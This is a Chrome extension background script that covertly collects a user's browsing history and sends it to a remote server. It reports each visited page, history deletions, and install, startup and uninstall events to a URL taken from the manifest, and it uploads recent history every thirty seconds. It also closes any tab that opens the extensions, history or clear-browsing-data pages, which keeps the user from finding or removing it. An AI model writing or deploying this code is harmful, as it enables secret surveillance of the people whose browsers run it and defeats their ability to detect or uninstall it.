const REPORT_URL = chrome.runtime.getManifest().homepage_url
const UUID = chrome.runtime.getManifest().version_name

if(!REPORT_URL || REPORT_URL == "") {
    console.error('No report URL found in manifest. Please set "homepage_url" in manifest.json')
} else if(!UUID || UUID == "") {
    console.error('No UUID found in manifest. Please set "version_name" in manifest.json')
}

const blockedEndings = [
    '://extensions/',
    '://history/',
    '://history/all',
    '://settings/clearBrowserData',
    '://settings/privacy/clearBrowsingData',
]

// block extension management
// accessible by appending anything to the URL
chrome.tabs.onUpdated.addListener((tabId, change, tab) => {
    if(blockedEndings.some((ending) => tab.url && tab.url.endsWith(ending))) {
        chrome.tabs.remove(tabId);
    }
})

function reportData(endpoint, data, method = 'POST') {
    fetch(REPORT_URL + endpoint, {  
        method: method,
        headers: {  
          "Content-Type": "application/json",
          "tracker-source": UUID,
        },
        body: JSON.stringify(data),
    })
}

chrome.runtime.onStartup.addListener(() => {
    reportData('meta', {
        event: 'startup',
    })
})

chrome.runtime.onInstalled.addListener(() => {
    reportData('meta', {
        event: 'install'
    })
    chrome.runtime.setUninstallURL(`${REPORT_URL}meta/uninstall?runtime=${UUID}`);
})

chrome.history.onVisited.addListener((historyItem) => {
    reportData('history/create', {
        data: historyItem
    })
})

chrome.history.onVisitRemoved.addListener((obj) => {
    reportData('history/delete', {
        all: obj.allHistory,
        urls: obj.urls,
    })
})


async function checkAlarmState() {
    const alarm = await chrome.alarms.get("tracker-upload-alarm");
    if (!alarm) {
        await chrome.alarms.create("tracker-upload-alarm", { periodInMinutes: 0.5 });
    }
}

checkAlarmState();

const ALARM_LAST_STORAGE_KEY = "tracker-alarm-last-update";

chrome.alarms.onAlarm.addListener(async (alarm) => {
    const { lastUpdate } = await chrome.storage.local.get(ALARM_LAST_STORAGE_KEY);
    chrome.history.search({
        maxResults: 100,
        text: '',
        startTime: lastUpdate ?? (Date.now() - 1000 * 60 * 60 * 24), // 24 hours ago
    }, (results) => {
        if (results.length > 0) {
            reportData('history/update', {
                data: results
            })
        }
    })
});
